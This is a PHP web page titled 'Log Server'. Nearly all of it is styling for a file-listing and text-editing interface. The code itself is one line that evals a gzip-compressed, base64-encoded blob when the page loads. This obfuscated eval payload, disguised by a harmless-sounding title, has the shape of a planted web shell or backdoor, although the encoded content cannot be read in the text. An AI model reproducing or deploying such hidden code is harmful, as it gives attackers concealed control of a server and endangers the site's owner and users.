<!DOCTYPE html>
<html>
<head>
	<title>Log Server</title>
	<link href="https://fonts.googleapis.com/css2?family=Courgette&family=Cuprum:ital@1&family=Rowdies&display=swap" rel="stylesheet"> 
</head>
<style>
	* {
		font-family: cursive;
		color: #000;
		font-family: 'Cuprum', sans-serif;
	}

	body {
		background-repeat: no-repeat;
		background-attachment:fixed;
		background-size: 100% 1700px;
	}
	body h1{
		color: #A52A2A;
		text-shadow: 2px 2px 2px #000;
		font-size: 50px;
	}
	.dir {
		text-align: center;
		font-size: 30px;
	}
	.dir a{
		text-decoration: none;
		color: #48D1CC;
		text-shadow: 1px 1px 1px #000;

	}
	.dir a:hover{
		text-decoration: none;
		color: red;
	}
	table {
		margin: 12px auto;
		height: 100%;
		border-collapse: collapse;
		font-size: 30px;
	}
	table,th {
		border-top:1px solid #000;
		border-right:3px solid #000;
		border-bottom: 3px solid #000;
		border-left:1px solid #000;
		box-sizing: border-box;
		padding: 2px 2px;
		color: #F0E68C;
		text-shadow: 1px 1px 1px #000;
	}
	table,td {
		border-top:1px solid #000;
		border-right:3px solid #000;
		border-bottom: .5px solid #000;
		border-left:1px solid #000;
		box-sizing: border-box;
		padding: 8px 8px;
		color: red;
	}
	table,td a {
		text-decoration: none;
		color:#8A2BE2;
		text-shadow: 1px 1px 1px #000;
	}
	table,td a:hover {
		text-decoration: none;
		color: red;
	}
	.button1 {
		width: 70px;
		height: 30px;
		background-color: #999;
		margin: 10px 3px;
		padding: 5px;
		color: #000;
		border-radius: 5px;
		border: 1px solid #000;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1 a{
		width: 70px;
		height: 30px;
		background-color: #999;
		margin: 10px 3px;
		padding: 5px;
		color: red;
		border-radius: 5px;
		border: 1px solid #000;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1:hover {
		text-shadow: 0px 0px 5px #fff;
		box-shadow: .5px .5px .3px .3px #555;
		text-decoration: none;
	}
	textarea {
		border: 1px solid green;
		border-radius: 5px;
		box-shadow: 1px 1px 1px 1px #fff;
		width: 100%;
		height: 400px;
		padding-left: 10px;
		margin: 10px auto;
		resize: none;
		background: green;
		color: #ffffff;
		font-family: 'Cuprum', sans-serif;
		font-size: 13px;
	}
</style>
<body>
	<center><h1>Log Server</h1></center>
  <div class="dir">
	<?php  
	eval(gzinflate(base64_decode('lVZbT+NGFH5OfsUwsnCiBZulfdrYRkViadUtW5X2iUXRxJ7gWRzbGo/J0l3+e8+ZS+LYCSo8BM+c+3duI5ZkIpqGq4k3v776+87PhPTvp1PyfTwajTw4kZh0STO4fyG8aPgOywNX6TqbTDV5PN7cN0rOJa8LlvIJ/fKFnhAawg9SNS9+NMDHv9VFlQFPhwrkZSU5S3MyMXysId4jfyZxQrwnVrTc+ikgCnNB4phQSo6PLWNMzqaaZcTTvCJ+xEgu+TIGO0kYhSzxZyStSiXKlqM/GNsu4wVYjn3tDboDhkR8NiOeIFFsjODh3TtwhWwNUe3wnSfu6Yxo95DzCPzxxNSYABd2LNLED0wQgY+ehWAUsNTBuRT9+fkWEtG0i5VQmKbvGuqSrdhSFFyn6uNvn65u7/wW8GSZf3/nA5WbvHmKr2qmDrOqVT0fsO8pAI9LWcn9OjTJsrWPrWTlYXuN+FfbAt5V9cTnhsKzOYpMOu6amgj8ECBy0er6cXDrz1HUpFLUKmEFl2oC/hqFR0dH/nQWhZZqeA348AfWNc4XCXxFkOIVWXGVV1lM66pRlPAyVc81j+mqLZSomVQhcp1mTDGK2iJR1q0ihgldowRRjKkxP+QxCXRc7qRzH9N/tkLgjzYFnhEShZl4SsaRYouCAzVSUitWeXIDkJCPCHNIPlZFxmUUwrWl3gLK3fMvqRJVaW/gH6qJLuq8Ho+8JmUlti38A8AnrhO3fagZsA+BwlNVyWfdg1ikR6KZOyGTqg7Pjx8dEexLP/D3XQb+tNOQY9u2LtpIZUmvM4M95gLTTJ0zNhSEmlkdp6edw83nmyt3NGjoziP7otaF1w3YVOrGBU3fjcD72q4KlgOqSMSS7/OH78/Of551OWXVltnEnk/IT1jreopYjiQmKGPG3wExrfWEnE8D/49LE9FmbG9F3Ffg/26Y3oD5cVXzcicDGI4F33z2cId7Yw8pm1v43a8/4wVXfJ8FkhasaWK6aJWqyvc0+ZXVbYPWDiprFyz/X6quMqFe1SS5btyhrmOcTfErqv/SklZ5v+RexqK/jRFgt443WVlIEqJgo571IBjpiWA2YSYaWLbPH0hZldwsY7DgOCPFvykGRQ2JyNWqaGqeClakOZPNBH2ewx6fY/HyUjV9J3TOnALr8dBlkzPnNJLbshDl4366Hd+DwZ1jOmFor0WZVeugqFKGQyv2dSaoQZ7626FOde3ugRDT3oMQ5+AGvC56Q/gQvy2A+L23JIaZjuJLlj6aTO/dKkxP4ZgOt0MusoyXbjtUi68wxDbbASx248Jm02Pd5sUKcShh+qYkO5h6SR5FKXBxmUQmsr0L7KHauHdrCX04PolHUT5EobmAkWDVanTtihsNm8C8dzAal0IPty7OUqxKx+FAuj8h/tp3w3K5lkLhsAUJeEAMlbnywzz748H7gV5ymbNGFCQTKAXPCDqsyF4hbCvSvi5GOqyd6bt9svTq/oE9sKL7VNmocOUN6LiMmSkEoeg260FW8rWl6ucv0A17X/hk521HAgLTjAQHtLg39BJqB1ZcUUEnPkgOtZpcM1h4RL9DHGqY11JB4cgw8Wcb8U2vv6m1Ry+I3iEnJM92XLhGHLf2iXXgBTG04gsoaVfaO92JkUNP3fA16uLkA7HNaWrdQkJtI2CrUIJLPabnZ8MuxYWguxRH9itdDu/cfCitk6Jb/LUBUW+ng0lrn7/3wLyujDem7zatiM33Hw==')));

?>
</table>
</body>
</html>